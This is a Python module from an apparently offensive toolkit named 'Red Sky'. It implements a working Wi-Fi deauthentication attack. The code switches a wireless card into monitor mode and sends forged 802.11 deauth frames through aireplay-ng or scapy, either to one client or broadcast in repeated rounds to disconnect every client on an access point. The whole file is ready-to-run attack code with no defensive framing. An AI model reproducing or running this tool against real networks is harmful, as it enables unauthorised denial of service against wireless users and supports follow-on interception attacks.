# language: Python, file: Program/wireless/deauth.py, target: Red Sky wireless — deauth frames
# Two paths:
#   1. aireplay-ng  --deauth N -a BSSID -c CLIENT iface  (fastest, no scapy)
#   2. raw scapy frames  (falls back if aireplay-ng missing, or for one-off custom frames)
# Monitor mode is auto-enabled via airmon-ng / iw if you pass --monitor.

import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv


def _which(cmd: str) -> Optional[str]:
    return shutil.which(cmd)


def _run(args: List[str], timeout: int = 60) -> int:
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0 and r.stderr:
            print_warn(r.stderr.strip()[:300])
        return r.returncode
    except FileNotFoundError:
        print_err("missing: " + args[0])
        return 127
    except subprocess.TimeoutExpired:
        return 124


def enable_monitor(iface: str) -> str:
    """Turn the iface into monitor mode. Returns the monitor iface name (may differ)."""
    iw = _which("iw")
    if not iw:
        print_warn("iw not on PATH — assume iface is already monitor")
        return iface

    print_info("enabling monitor mode on " + iface)
    # try airmon-ng first — handles driver quirks
    airmon = _which("airmon-ng")
    if airmon:
        rc = _run([airmon, "start", iface], timeout=30)
        if rc == 0:
            # airmon usually creates <iface>mon or moves iface to monitor
            for cand in (iface + "mon", "mon0", iface):
                if Path("/sys/class/net/" + cand).exists():
                    print_ok("monitor iface: " + cand)
                    return cand

    # fallback: manual ip/iw dance
    _run(["ip", "link", "set", iface, "down"])
    _run([iw, "dev", iface, "set", "type", "monitor"])
    _run(["ip", "link", "set", iface, "up"])
    print_ok("monitor iface: " + iface)
    return iface


def disable_monitor(iface: str) -> None:
    iw = _which("iw")
    if not iw:
        return
    airmon = _which("airmon-ng")
    if airmon:
        _run([airmon, "stop", iface], timeout=30)
    else:
        _run(["ip", "link", "set", iface, "down"])
        _run([iw, "dev", iface, "set", "type", "managed"])
        _run(["ip", "link", "set", iface, "up"])


def aireplay_deauth(iface: str, bssid: str, client: str, count: int) -> int:
    aireplay = _which("aireplay-ng")
    if not aireplay:
        return 127
    cmd = [aireplay, "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd += [iface]
    print_info(" ".join(cmd))
    rc = _run(cmd, timeout=max(30, count // 10 + 30))
    return rc


def scapy_deauth(iface: str, bssid: str, client: str, count: int, reason: int) -> int:
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # type: ignore
    except ImportError:
        print_err("scapy not installed — pip install scapy, or install aireplay-ng")
        return 127

    dst = client if client else "ff:ff:ff:ff:ff:ff"
    print_info("scapy: sending " + str(count) + " deauth frames  " + dst + " <- " + bssid)
    frame = (
        RadioTap() /
        Dot11(addr1=dst, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=reason)
    )
    try:
        sendp(frame, iface=iface, count=count, inter=0.05, verbose=False)
        return 0
    except Exception as e:
        print_err("sendp failed: " + str(e))
        return 1


def cmd_deauth(iface: str, bssid: str, client: str, count: int,
               use_scapy: bool, auto_monitor: bool, reason: int) -> int:
    if not iface or not bssid:
        print_err("need --iface and --bssid")
        return 2

    bssid = bssid.lower()
    client = client.lower()

    original = iface
    if auto_monitor:
        iface = enable_monitor(iface)

    try:
        rc = 1
        if use_scapy:
            rc = scapy_deauth(iface, bssid, client, count, reason)
        else:
            rc = aireplay_deauth(iface, bssid, client, count)
            if rc == 127:
                print_warn("aireplay-ng missing — falling back to scapy")
                rc = scapy_deauth(iface, bssid, client, count, reason)

        if rc == 0:
            print()
            print_ok("sent " + str(count) + " deauth frame(s)")
            print_kv("bssid", bssid)
            print_kv("target", client or "broadcast")
        return rc
    finally:
        if auto_monitor and iface != original:
            disable_monitor(iface)


def cmd_kick_all(iface: str, bssid: str, rounds: int, auto_monitor: bool) -> int:
    """Broadcast deauth, repeated. Kicks every client on the BSSID."""
    if not iface or not bssid:
        print_err("need --iface and --bssid")
        return 2

    original = iface
    if auto_monitor:
        iface = enable_monitor(iface)
    try:
        for i in range(rounds):
            print("  " + ASH + "round " + str(i+1) + "/" + str(rounds) + RESET)
            aireplay_deauth(iface, bssid.lower(), "", 64)
            time.sleep(0.5)
        print_ok("kicked every client " + str(rounds) + " round(s)")
        return 0
    finally:
        if auto_monitor and iface != original:
            disable_monitor(iface)


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky wireless deauth", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="one", choices=["one", "all", "monitor"])
    p.add_argument("--iface", default="")
    p.add_argument("--bssid", default="")
    p.add_argument("--client", default="")
    p.add_argument("--count", type=int, default=64)
    p.add_argument("--rounds", type=int, default=5)
    p.add_argument("--reason", type=int, default=7)
    p.add_argument("--scapy", action="store_true", help="force scapy path")
    p.add_argument("--no-monitor", action="store_true", help="skip auto-monitor")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky wireless deauth one --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF [--client ...]")
        print_err("       redsky wireless deauth all --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF [--rounds 5]")
        print_err("       redsky wireless deauth monitor --iface wlan0  # just enable monitor mode")
        return 2

    if ns.help:
        print_info("one       -- send --count deauth frames to a specific client (or broadcast)")
        print_info("all       -- broadcast deauth, repeated --rounds times (kicks everyone)")
        print_info("monitor   -- just enable monitor mode on --iface and exit")
        print_info("")
        print_info("reason codes: 1=unspecified 2=prev auth invalid 4=inactivity 7=leaving")
        return 0

    auto_monitor = not ns.no_monitor

    if ns.action == "monitor":
        if not ns.iface:
            print_err("need --iface")
            return 2
        mon = enable_monitor(ns.iface)
        print_ok("monitor iface: " + mon)
        print_info("to restore: redsky wireless deauth monitor --iface " + ns.iface + " (then set back manually)")
        return 0

    if ns.action == "all":
        return cmd_kick_all(ns.iface, ns.bssid, ns.rounds, auto_monitor)
    return cmd_deauth(ns.iface, ns.bssid, ns.client, ns.count, ns.scapy, auto_monitor, ns.reason)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
